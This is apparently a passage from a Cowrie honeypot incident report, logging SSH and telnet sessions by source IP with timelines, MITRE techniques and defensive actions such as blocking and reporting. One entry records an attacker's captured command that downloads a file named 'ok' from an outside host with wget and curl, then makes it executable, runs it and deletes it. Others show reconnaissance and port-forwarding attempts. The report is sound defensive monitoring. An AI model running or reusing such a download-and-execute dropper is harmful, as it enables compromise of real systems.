| `2026-08-19 20:13:57` | `cowrie.session.connect` |
| `2026-08-19 20:13:57` | `cowrie.client.version` |
| `2026-08-19 20:13:57` | `cowrie.client.kex` |
| `2026-08-19 20:13:57` | `cowrie.login.success` |
| `2026-08-19 20:13:58` | `cowrie.session.params` |
| `2026-08-19 20:13:58` | `cowrie.command.input` |
| `2026-08-19 20:13:58` | `cowrie.log.closed` |
| `2026-08-19 20:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52f2f5d8910c

| Field | Detail |
|---|---|
| **Source IP** | `218.202.91[.]147` |
| **First Seen** | 2026-08-19 20:17 |
| **Last Seen** | 2026-08-19 20:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:17:11` | `cowrie.session.connect` |
| `2026-08-19 20:17:12` | `cowrie.client.version` |
| `2026-08-19 20:17:12` | `cowrie.client.kex` |
| `2026-08-19 20:17:14` | `cowrie.login.success` |
| `2026-08-19 20:17:15` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:17:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.91[.]147` to AbuseIPDB if not already reported
- [ ] Block `218.202.91[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4362ae9c79b9

| Field | Detail |
|---|---|
| **Source IP** | `112.25.140[.]211` |
| **First Seen** | 2026-08-19 20:17 |
| **Last Seen** | 2026-08-19 20:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:17:21` | `cowrie.session.connect` |
| `2026-08-19 20:17:22` | `cowrie.client.version` |
| `2026-08-19 20:17:22` | `cowrie.client.kex` |
| `2026-08-19 20:17:24` | `cowrie.login.success` |
| `2026-08-19 20:17:25` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.25.140[.]211` to AbuseIPDB if not already reported
- [ ] Block `112.25.140[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dab5c2f61e3

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 20:19 |
| **Last Seen** | 2026-08-19 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:19:54` | `cowrie.session.connect` |
| `2026-08-19 20:19:54` | `cowrie.client.version` |
| `2026-08-19 20:19:54` | `cowrie.client.kex` |
| `2026-08-19 20:19:54` | `cowrie.login.success` |
| `2026-08-19 20:19:55` | `cowrie.session.params` |
| `2026-08-19 20:19:55` | `cowrie.command.input` |
| `2026-08-19 20:19:55` | `cowrie.log.closed` |
| `2026-08-19 20:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e8f30d3b8d3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-19 20:23 |
| **Last Seen** | 2026-08-19 20:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:23:32` | `cowrie.session.connect` |
| `2026-08-19 20:23:32` | `cowrie.client.version` |
| `2026-08-19 20:23:32` | `cowrie.client.kex` |
| `2026-08-19 20:23:32` | `cowrie.login.success` |
| `2026-08-19 20:23:32` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:23:32` | `cowrie.direct-tcpip.data` |
| `2026-08-19 20:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a0c4d138947

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 20:24 |
| **Last Seen** | 2026-08-19 20:25 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:24:58` | `cowrie.session.connect` |
| `2026-08-19 20:24:59` | `cowrie.client.version` |
| `2026-08-19 20:24:59` | `cowrie.client.kex` |
| `2026-08-19 20:25:06` | `cowrie.login.success` |
| `2026-08-19 20:25:09` | `cowrie.session.params` |
| `2026-08-19 20:25:09` | `cowrie.command.input` |
| `2026-08-19 20:25:12` | `cowrie.log.closed` |
| `2026-08-19 20:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c789512e3ff

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 20:25 |
| **Last Seen** | 2026-08-19 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:25:51` | `cowrie.session.connect` |
| `2026-08-19 20:25:51` | `cowrie.client.version` |
| `2026-08-19 20:25:51` | `cowrie.client.kex` |
| `2026-08-19 20:25:51` | `cowrie.login.success` |
| `2026-08-19 20:25:52` | `cowrie.session.params` |
| `2026-08-19 20:25:52` | `cowrie.command.input` |
| `2026-08-19 20:25:52` | `cowrie.log.closed` |
| `2026-08-19 20:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0136b03767f6

| Field | Detail |
|---|---|
| **Source IP** | `120.234.195[.]41` |
| **First Seen** | 2026-08-19 20:27 |
| **Last Seen** | 2026-08-19 20:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:27:23` | `cowrie.session.connect` |
| `2026-08-19 20:27:24` | `cowrie.client.version` |
| `2026-08-19 20:27:24` | `cowrie.client.kex` |
| `2026-08-19 20:27:26` | `cowrie.login.success` |
| `2026-08-19 20:27:26` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.195[.]41` to AbuseIPDB if not already reported
- [ ] Block `120.234.195[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dfa92e4121a

| Field | Detail |
|---|---|
| **Source IP** | `211.247.127[.]250` |
| **First Seen** | 2026-08-19 20:27 |
| **Last Seen** | 2026-08-19 20:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:27:32` | `cowrie.session.connect` |
| `2026-08-19 20:27:33` | `cowrie.client.version` |
| `2026-08-19 20:27:33` | `cowrie.client.kex` |
| `2026-08-19 20:27:35` | `cowrie.login.success` |
| `2026-08-19 20:27:36` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.247.127[.]250` to AbuseIPDB if not already reported
- [ ] Block `211.247.127[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4aa8ab797ca

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 20:31 |
| **Last Seen** | 2026-08-19 20:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:31:48` | `cowrie.session.connect` |
| `2026-08-19 20:31:48` | `cowrie.client.version` |
| `2026-08-19 20:31:48` | `cowrie.client.kex` |
| `2026-08-19 20:31:48` | `cowrie.login.success` |
| `2026-08-19 20:31:49` | `cowrie.session.params` |
| `2026-08-19 20:31:49` | `cowrie.command.input` |
| `2026-08-19 20:31:49` | `cowrie.log.closed` |
| `2026-08-19 20:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06f62782a2bc

| Field | Detail |
|---|---|
| **Source IP** | `117.177.235[.]249` |
| **First Seen** | 2026-08-19 20:32 |
| **Last Seen** | 2026-08-19 20:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:32:34` | `cowrie.session.connect` |
| `2026-08-19 20:32:35` | `cowrie.client.version` |
| `2026-08-19 20:32:35` | `cowrie.client.kex` |
| `2026-08-19 20:32:39` | `cowrie.login.success` |
| `2026-08-19 20:32:40` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.177.235[.]249` to AbuseIPDB if not already reported
- [ ] Block `117.177.235[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19c33fab9834

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-19 20:32 |
| **Last Seen** | 2026-08-19 20:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:32:45` | `cowrie.session.connect` |
| `2026-08-19 20:32:46` | `cowrie.client.version` |
| `2026-08-19 20:32:46` | `cowrie.client.kex` |
| `2026-08-19 20:32:47` | `cowrie.login.success` |
| `2026-08-19 20:32:48` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b00e1469aba

| Field | Detail |
|---|---|
| **Source IP** | `196.219.75[.]143` |
| **First Seen** | 2026-08-19 20:33 |
| **Last Seen** | 2026-08-19 20:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:33:36` | `cowrie.session.connect` |
| `2026-08-19 20:33:36` | `cowrie.client.version` |
| `2026-08-19 20:33:36` | `cowrie.client.kex` |
| `2026-08-19 20:33:38` | `cowrie.login.success` |
| `2026-08-19 20:33:38` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.75[.]143` to AbuseIPDB if not already reported
- [ ] Block `196.219.75[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f95f7a9d561

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]123` |
| **First Seen** | 2026-08-19 20:33 |
| **Last Seen** | 2026-08-19 20:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:33:51` | `cowrie.session.connect` |
| `2026-08-19 20:33:52` | `cowrie.client.version` |
| `2026-08-19 20:33:52` | `cowrie.client.kex` |
| `2026-08-19 20:33:57` | `cowrie.login.success` |
| `2026-08-19 20:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]123` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a2f6731020e

| Field | Detail |
|---|---|
| **Source IP** | `85.105.2[.]51` |
| **First Seen** | 2026-08-19 20:34 |
| **Last Seen** | 2026-08-19 20:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:34:02` | `cowrie.session.connect` |
| `2026-08-19 20:34:03` | `cowrie.client.version` |
| `2026-08-19 20:34:03` | `cowrie.client.kex` |
| `2026-08-19 20:34:04` | `cowrie.login.success` |
| `2026-08-19 20:34:04` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.2[.]51` to AbuseIPDB if not already reported
- [ ] Block `85.105.2[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc031c89e0f9

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-08-19 20:34 |
| **Last Seen** | 2026-08-19 20:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:34:37` | `cowrie.session.connect` |
| `2026-08-19 20:34:38` | `cowrie.client.version` |
| `2026-08-19 20:34:38` | `cowrie.client.kex` |
| `2026-08-19 20:34:40` | `cowrie.login.success` |
| `2026-08-19 20:34:40` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:34:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc5ca1683e6d

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-08-19 20:34 |
| **Last Seen** | 2026-08-19 20:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:34:46` | `cowrie.session.connect` |
| `2026-08-19 20:34:46` | `cowrie.client.version` |
| `2026-08-19 20:34:46` | `cowrie.client.kex` |
| `2026-08-19 20:34:49` | `cowrie.login.success` |
| `2026-08-19 20:34:49` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-406b609f7e8f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 20:36 |
| **Last Seen** | 2026-08-19 20:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:36:30` | `cowrie.session.connect` |
| `2026-08-19 20:36:30` | `cowrie.client.version` |
| `2026-08-19 20:36:31` | `cowrie.client.kex` |
| `2026-08-19 20:36:31` | `cowrie.login.success` |
| `2026-08-19 20:36:33` | `cowrie.session.params` |
| `2026-08-19 20:36:33` | `cowrie.command.input` |
| `2026-08-19 20:36:33` | `cowrie.command.input` |
| `2026-08-19 20:36:33` | `cowrie.command.input` |
| `2026-08-19 20:36:33` | `cowrie.command.input` |
| `2026-08-19 20:36:33` | `cowrie.command.input` |
| `2026-08-19 20:36:33` | `cowrie.command.success` |
| `2026-08-19 20:36:33` | `cowrie.command.input` |
| `2026-08-19 20:36:33` | `cowrie.command.input` |
| `2026-08-19 20:36:33` | `cowrie.command.input` |
| `2026-08-19 20:36:33` | `cowrie.command.input` |
| `2026-08-19 20:36:33` | `cowrie.log.closed` |
| `2026-08-19 20:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0341726cb9d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-19 20:37 |
| **Last Seen** | 2026-08-19 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:37:24` | `cowrie.session.connect` |
| `2026-08-19 20:37:24` | `cowrie.telnet.option` |
| `2026-08-19 20:37:24` | `cowrie.login.success` |
| `2026-08-19 20:37:24` | `cowrie.session.params` |
| `2026-08-19 20:37:24` | `cowrie.telnet.option` |
| `2026-08-19 20:37:24` | `cowrie.telnet.option` |
| `2026-08-19 20:37:24` | `cowrie.command.input` |
| `2026-08-19 20:37:24` | `cowrie.command.input` |
| `2026-08-19 20:37:24` | `cowrie.command.input` |
| `2026-08-19 20:37:24` | `cowrie.command.input` |
| `2026-08-19 20:37:24` | `cowrie.command.input` |
| `2026-08-19 20:37:24` | `cowrie.command.input` |
| `2026-08-19 20:37:24` | `cowrie.command.input` |
| `2026-08-19 20:37:24` | `cowrie.command.input` |
| `2026-08-19 20:37:24` | `cowrie.command.failed` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.success` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.failed` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.success` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.failed` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.success` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.command.failed` |
| `2026-08-19 20:37:25` | `cowrie.command.input` |
| `2026-08-19 20:37:25` | `cowrie.log.closed` |
| `2026-08-19 20:37:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a66dc239529

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 20:37 |
| **Last Seen** | 2026-08-19 20:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:37:39` | `cowrie.session.connect` |
| `2026-08-19 20:37:40` | `cowrie.client.version` |
| `2026-08-19 20:37:40` | `cowrie.client.kex` |
| `2026-08-19 20:37:47` | `cowrie.login.success` |
| `2026-08-19 20:37:51` | `cowrie.session.params` |
| `2026-08-19 20:37:51` | `cowrie.command.input` |
| `2026-08-19 20:37:53` | `cowrie.log.closed` |
| `2026-08-19 20:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b166cdc5cfe

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 20:37 |
| **Last Seen** | 2026-08-19 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:37:45` | `cowrie.session.connect` |
| `2026-08-19 20:37:45` | `cowrie.client.version` |
| `2026-08-19 20:37:45` | `cowrie.client.kex` |
| `2026-08-19 20:37:45` | `cowrie.login.success` |
| `2026-08-19 20:37:46` | `cowrie.session.params` |
| `2026-08-19 20:37:46` | `cowrie.command.input` |
| `2026-08-19 20:37:46` | `cowrie.log.closed` |
| `2026-08-19 20:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c54f1c7c8d54

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-19 20:38 |
| **Last Seen** | 2026-08-19 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:38:36` | `cowrie.session.connect` |
| `2026-08-19 20:38:36` | `cowrie.client.version` |
| `2026-08-19 20:38:36` | `cowrie.client.kex` |
| `2026-08-19 20:38:37` | `cowrie.login.success` |
| `2026-08-19 20:38:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf2f4404af8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-19 20:38 |
| **Last Seen** | 2026-08-19 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:38:36` | `cowrie.session.connect` |
| `2026-08-19 20:38:36` | `cowrie.client.version` |
| `2026-08-19 20:38:36` | `cowrie.client.kex` |
| `2026-08-19 20:38:37` | `cowrie.login.success` |
| `2026-08-19 20:38:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-539e5fd3149e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 20:39 |
| **Last Seen** | 2026-08-19 20:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
